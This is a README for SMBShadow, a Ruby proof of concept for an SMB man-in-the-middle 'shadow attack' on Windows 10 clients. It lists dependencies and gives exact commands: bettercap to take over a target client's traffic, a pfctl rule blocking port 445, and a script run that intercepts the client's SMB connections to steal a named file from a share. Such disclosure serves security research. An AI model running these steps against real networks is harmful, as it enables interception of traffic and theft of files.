About:
------

SMBShadow is a Proof-of-Concept for the SMB Shadow Attack.
See the Blog Post: https://strontium.io/blog/introducing-windows-10-smb-shadow-attack

Dependencies:
-------------

SMBShadow requires the following ruby gems.
They can be installed with "gem install <gem_name>".
  - interfacez
  - packetgen
  - packetgen-plugin-smb
  - ruby_smb
In addition, the "bettercap" gem is for network takeovers.

Usage:
------

Fire up bettercap in one terminal:
sudo bettercap -I $(ruby -e 'require "interfacez"; print Interfacez.default') -T <smb_client_ip>

Then open up another terminal and disable packet forwarding:
printf "block out on $(ruby -e 'require "interfacez"; print Interfacez.default') proto tcp from any to any port 445\n" | sudo pfctl -f - && sudo pfctl -e

Finally start up the smbshadow script:
sudo ruby smbshadow.rb <smb_server_ip> \\Share\\Path\\To\\File.txt

This will intercept any connections from smb_client to smb_server,
and try to retrieve File.txt from the Share.
